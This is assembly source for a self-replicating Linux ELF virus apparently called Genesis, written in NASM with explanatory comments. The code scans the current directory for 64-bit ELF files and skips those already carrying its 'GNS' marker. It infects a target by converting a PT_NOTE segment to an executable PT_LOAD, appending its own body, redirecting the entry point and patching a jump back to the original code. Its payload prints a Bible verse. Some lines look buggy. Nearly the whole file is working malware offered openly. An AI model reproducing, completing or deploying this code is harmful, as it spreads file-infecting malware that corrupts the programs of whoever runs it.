;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
;@;                                                           genesis.asm ;@;
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;

; nasm -f elf64 genesis.asm -o genesis.o
; ld genesis.o -o genesis

; Note: Because I'm weird I decided to use camelCase for 
;       variables and macros. Jokes aside, for this I wanted
;       to experiment by approaching ASM like an high-level
;       language, thus making it *hopefully* more readable
;       for people unfamiliar with ASM.

%include "src/Macros.asm"
%include "src/Structs.asm"

global _start
_start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  ;; SAVE ARGV >------------------------------------------------------------<

  mov   r15,  rsp

  ;; ENUM FILES >-----------------------------------------------------------<

  push  "."
  Open  rsp,  O_RDONLY, 0x00  ; rax = Open(".", 0, 0)

  test  rax,  rax             ; if (rax < 0)
  jl    VExitRoutine          ;   exit()

  sub   rsp,  0x10            ; alloc 4 elf_magic
  push  rax                   ; save fd
  push  0x00                  ; bytes read
  sub   rsp,  SZ_DENT
  
  GetDents64 [rsp + SZ_DENT + 8], rsp, SZ_DENT  ; GetDents64(fd, buf, buflen)
  test  rax,  rax
  jl    .EnumDirDone

  xor   r9,   r9             ; Counter   = 0
  mov   [rsp + SZ_DENT],  rax ; EndCount  = rax
  
  .EnumFiles:
    cmp   byte [rsp + r9 + linux_dirent64.d_type], DT_REG
    jne   .NextIteration

    ;; GET FILE >-----------------------------------------------------------<
    
    lea   r13, [rsp + r9 + linux_dirent64.d_name]

    Open  r13,  O_RDWR, 0x00
    test  rax,  rax
    js   .NextIteration
  
    mov   rbx,  rax   ; save fd
    
    lea   r14,  [rsp + SZ_DENT + 16]
    Read  rbx,  r14, 0x10
    cmp   rax,  0x10
    jne   .NextFile

    ;; CHECK IF ELF >-------------------------------------------------------<
    
    cmp   dword [r14], ELF_MAGIC
    jne   .NextFile

    ;; CHECK ALREADY INFECTED >---------------------------------------------<

    mov   eax, dword [r14 + 0xC]
    cmp   eax, 0x534e4700         ; Check for "GNS" in Padding
    je    .NextFile               ; Already Infected
    
    ;; INFECT FILE >--------------------------------------------------------<

    push  rbx
    call  Infect
    pop   rbx
    jmp   .EnumDirDone

  .NextFile:
    Close rbx

  .NextIteration:
    add   r9w, word [rsp + linux_dirent64.d_reclen]  ; len
    cmp   r9w, word [rsp + SZ_DENT]                  ; bytes_read
    jne   .EnumFiles

.EnumDirDone:
  Close   rbx
  add     rsp,  SZ_DENT
  pop     rdi
  Close   [rsp]
  mov     rsp,  r15
  jmp     VExitRoutine

Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  push    rbp
  mov     rbp,  rsp
  sub     rsp,  0x90 

  ;; STAT + MMAP >----------------------------------------------------------<
  
  FStat   rdi,  rsp
  test    rax,  rax
  jne     .InfectExit
  
  ; extend filesize (ftruncate)
  xor     rbx,  rbx
  mov     rbx,  VExitRoutine
  mov     rax,  _start
  sub     rbx,  rax

  mov     r10,  [rsp + stat.st_size]  ; save copy :)

  add     rbx,  [rsp + stat.st_size]  ; host + vx
  add     rsp,  0x90                  ; free my boi stack, he aint do nun' wrong

  ; align to page size
  add     rbx,  0xFFF                 ; add page_size-1
  and     rbx,  -0x1000

  xor     rsi,  rsi
  FTruncate     rdi,  rbx
  test    rax,  rax
  jne     .InfectExit

  sub     rsp,  0x20
  push    rbx
  push    r9
  push    rdi

  ; Mmap(...)
  MMap    rbx,  PROT_READWRITE, [rsp]

  pop     rdi                         ; restore regs
  pop     r9

  test    rax,  rax                   ; check if mmap(...) failed
  js      .InfectExit

  push    rax                         ; rsp         -> FileMap (ELF-HDR)
                                      ; rsp + 0x8   -> FileSz
                                      ; rsp + 0x10  -> Old Entry
                                      ; rsp + 0x18  -> Program Hdr
                                      ; rsp + 0x20  -> EOF

  ;; SAVE OLD ENTRY >-------------------------------------------------------<
  
  ; check 64bit
  movzx   rbx,  byte [rax + 4]
  cmp     rbx,  ELF_64BIT
  jne     .InfectCleanUp

  ; check little endian
  movzx   rbx,  byte [rax + 5]
  cmp     rbx,  ELF_LENDIAN
  jne     .InfectCleanUp

  ; check architecture
  movzx   rbx,  byte [rax + elf64_hdr.e_machine]
  cmp     rbx,  ELF_AMD64
  jne     .InfectCleanUp

  ; save entry
  mov     rax,  [rax + elf64_hdr.e_entry]
  mov     [rsp + 0x10], rax

  ;; LOOP THROUGH PHDR >----------------------------------------------------<

  xor     rcx,  rcx
  mov     rax,  [rsp]
  mov     rdx,  rax
  add     rax,  [rax + elf64_hdr.e_phoff]

  .ProgramHdrLoop:
    movzx   rbx,  word [rdx + elf64_hdr.e_phentsize]  ; phentsize
    imul    rbx,  rcx                                 ; phentsize * i
    
    lea     r12,  [rax + rbx]
    mov     [rsp + 0x18], r12                         ; store prog_hdr on stack

    movzx   rbx,  word [rax + rbx]  ; rbx = *(phoff + (phentsize * i))
    
    cmp     rbx, PT_NOTE
    je      .ConvertPtNote
    
    cmp     rcx,  [rax + elf64_hdr.e_phnum]
    inc     rcx,  
    jnz     .ProgramHdrLoop

  jmp .InfectCleanUp

  ;; CONVERT TO PT_LOAD >---------------------------------------------------<

  .ConvertPtNote:
  
  mov   dword [r12 + elf64_phdr.p_type],  PT_LOAD     ; p_type
  mov   dword [r12 + elf64_phdr.p_flags], PT_FLAG_RX  ; p_flags
  
  mov   rcx,  VExitRoutine
  mov   rbx,  _start
  sub   rcx,  rbx           ; rcx = size V-Body

  mov   qword [r12 + elf64_phdr.p_filesz],  rcx       ; p_filesz
  mov   qword [r12 + elf64_phdr.p_filesz],  rcx       ; p_memsz

  mov   rbx,  [rsp + 0x8]
  sub   rbx,  rcx           ; rbx = size H-Body

  mov   qword [r12 + elf64_phdr.p_offset],  rbx       ; p_offset

  mov   [rsp + 0x20], rbx
  add   rbx,  0xc000000

  mov   qword [r12 + elf64_phdr.p_vaddr],   rbx       ; p_vaddr

  ;; WRITE SELF AT LOCATION >-----------------------------------------------<

  mov   rcx,  VExitRoutine
  mov   rbx,  _start
  sub   rcx,  rbx           ; rcx = size V-Body

  sub   rsp,  0x8
  push  rdi

  mov   rsi, _start         ; source address
  mov   rdi, [rsp + 0x28]   ; destination address
  rep   movsb

  pop   rdi
  add   rsp,  0x8

  ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<

  ; NewEntry = GetRip() - (V_SIZE + 5) - V_Entry + OEP
  call  GetRip                ; GetRip()
  mov   rbx,  _start
  mov   rcx,  VExitRoutine
  sub   rcx,  rbx             ; V_Size
  add   rcx,  0x5             ; V_Size + 5
  sub   rax,  rcx             ; RIP - (V_Size+5)
  lea   rbx,  [rsp + 0x18]
  sub   rax,  [rbx + elf64_phdr.p_vaddr]
  add   rax,  [rsp + 0x10]

  ; patch the jmp
  lea   rbx,  [rsp]   
  mov   byte  [rbx + rcx],  0xe9  ; jmp
  inc   rcx
  mov   dword [rbx + rcx],  eax   ; addr

  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<

  mov   rbx,  [rsp + 0x20]
  mov   rcx,  [rsp]
  mov   [rcx + elf64_hdr.e_entry],    rbx       ; patch entry
  
  ;; WRITE SIGNATURE >------------------------------------------------------<
  
  mov   rbx,  [rsp]
  mov   dword [rbx + 0xC], 0x534e4700

  ;; OVERWRITE FILE >-------------------------------------------------------<

  sub   rsp,  0x8
  push  rdi

  ; msync(addr, len, MS_SYNC) 
  MSync [rsp + 0x10], [rsp + 0x18], MS_SYNC

  pop   rdi
  add   rsp,  0x8

  test  rax,  rax
  js    .InfectCleanUp

  ; fsync(fd) - just to make sure
  FSync rdi

  jmp .Payload
  ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<

  .msg:    ; idk why I made it a byte array... xD
    	db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
	    db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
	    db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
	    db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
	    db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
	    db	0x74, 0x66, 0x69, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
	    db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
	    db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
	    db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
	    db	0x62, 0x64, 0x75, 0x65, 0x20, 0x69, 0x74, 0x27, 0x2e, 0x0a, 
      db  0x00
      msglen equ $-.msg

  .Payload:
  Write STDOUT, .msg, msglen

  .InfectCleanUp:
  MUnMap  [rsp], [rsp + 0x8]

  .InfectExit:
  xor     rax,  rax
  mov     rsp,  rbp
  pop     rbp
  ret

GetRip:
  mov     rax,  [rsp]
  ret

VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
  Exit 0x00

